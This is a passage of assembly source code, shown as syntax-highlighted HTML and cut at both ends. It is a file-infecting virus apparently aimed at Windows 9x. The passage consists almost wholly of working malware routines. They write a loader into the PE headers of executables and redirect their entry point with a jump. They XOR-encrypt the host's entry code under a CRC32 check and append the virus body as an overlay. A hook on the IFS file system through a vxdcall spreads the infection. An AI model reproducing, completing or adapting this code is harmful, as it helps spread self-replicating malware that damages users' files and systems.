       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;sum size of all headerz</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lsize</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">84</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;total size of headerz</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">errorclose</span><span class="sc0">                      </span><span class="sc1">;enought to loader?</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lsize</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loader</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy loader to pe header</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bname</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">.nextbyte</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.nextbyte</span><span class="sc0">                           </span><span class="sc1">;copy host name</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">160</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">.relocs</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">164</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">.relocs</span><span class="sc0">                        </span><span class="sc1">;shit, relocz present</span><span class="sc0">
    </span><span class="sc9">%if</span><span class="sc0"> </span><span class="sc5">userda</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmpentry</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;signal rda used</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">-</span><span class="sc2">0x28</span><span class="sc0">
 </span><span class="sc5">.next</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x28</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;is EIP pointing inside</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;this section?</span><span class="sc0">
       </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">.next</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">            </span><span class="sc1">;make section writeable</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;edx point physical entrypoint</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;save virus entry</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD600</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x100</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer2</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;esi point entrycode</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">                                </span><span class="sc1">;read entry code</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x100</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc32</span><span class="sc0">                              </span><span class="sc1">;calc crc32 of 100h bytes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rdacrc32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">
  </span><span class="sc5">.rdaloop</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;encript crc32ed code</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.rdaloop</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hostcode</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">
       </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;save entrycode</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">;edi point to entrycode</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE9</span><span class="sc0">                            </span><span class="sc1">;esi point to pe header</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;store displacement</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD601</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x100</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">                                </span><span class="sc1">;write pe headerz</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.norelocs</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
  </span><span class="sc5">.relocs</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmpentry</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;flag as normal file</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;set new entrypoint</span><span class="sc0">
  </span><span class="sc5">.norelocs</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD601</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">84</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">                                </span><span class="sc1">;write pe headerz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD800</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">                                </span><span class="sc1">;get filesize</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD601</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vsize</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">                                </span><span class="sc1">;write overlay code</span><span class="sc0">
  </span><span class="sc5">errorclose</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD700</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">                                </span><span class="sc1">;close file</span><span class="sc0">
  </span><span class="sc10">error</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rdacrc32</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">jmpentry</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hostcode</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">recurse</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mz_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">install</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">install</span><span class="sc0">                        </span><span class="sc1">;esi point to start of vcode</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">recurse</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD700</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">                                </span><span class="sc1">;close file</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">skip</span><span class="sc0">
  </span><span class="sc5">fix1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc5">vxdcall</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc0">                      </span><span class="sc1">;hook ifs</span><span class="sc0">
  </span><span class="sc5">skip</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">oldhook</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">.restore</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">%if</span><span class="sc0"> </span><span class="sc5">userda</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">jmpentry</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.norda</span><span class="sc0">                               </span><span class="sc1">;was rda used?</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">loader.entrypoint</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">hostcode</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">
       </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;restore init code</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x100</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">rdacrc32</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">loader.entrypoint</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rda</span><span class="sc0">                                </span><span class="sc1">;rda decript host</span><span class="sc0">
  </span><span class="sc5">.norda</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">%if</span><span class="sc0"> </span><span class="sc5">userda</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc0">
  </span><span class="sc5">crc32_pbfr</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">0x0C</span><span class="sc0">
  </span><span class="sc5">crc32_sz</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">0x08</span><span class="sc0">
  </span><span class="sc5">crc32_ret@</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">0x04</span><span class="sc0">
  </span><span class="sc5">crc32_ebp@</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">0x00</span><span class="sc0">

</span><span class="sc5">crc32</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crc32_pbfr</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crc32_sz</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;setup regz</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;init crc32</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">.aa</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;get byte</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
  </span><span class="sc5">.ab</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">.ac</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08320</span><span class="sc0">                         </span><span class="sc1">;logarithm</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0edb8</span><span class="sc0">
  </span><span class="sc5">.ac</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.ab</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.aa</span><span class="sc0">                                 </span><span class="sc1">;next byte</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                             </span><span class="sc1">;cx:dx to ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
